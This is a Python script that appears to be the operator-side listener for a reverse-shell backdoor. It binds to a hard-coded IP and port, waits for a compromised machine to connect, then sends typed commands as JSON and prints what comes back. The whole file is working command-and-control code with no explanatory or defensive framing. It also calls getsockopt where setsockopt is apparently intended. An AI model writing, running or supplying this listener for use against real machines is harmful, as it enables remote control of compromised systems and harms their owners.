import socket
import json


class Listener:
    def __init__(self, ip, port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.getsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((ip, port))
        s.listen(0)
        print("[+] Listening for connections")
        self.conn, addr = s.accept()
        print("[+] Connection established from:", addr)

    def recv_reliably(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.conn.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def send_reliably(self, commands):
        json_obj = json.dumps(commands)
        self.conn.send(json_obj.encode())

    def run(self):
        while True:
            commands = input("=>").split(' ')
            self.send_reliably(commands)
            if commands[0] == "exit":
                break
            results = self.recv_reliably()
            print(results)


my_listener = Listener("192.168.43.13", 8080)
my_listener.run()
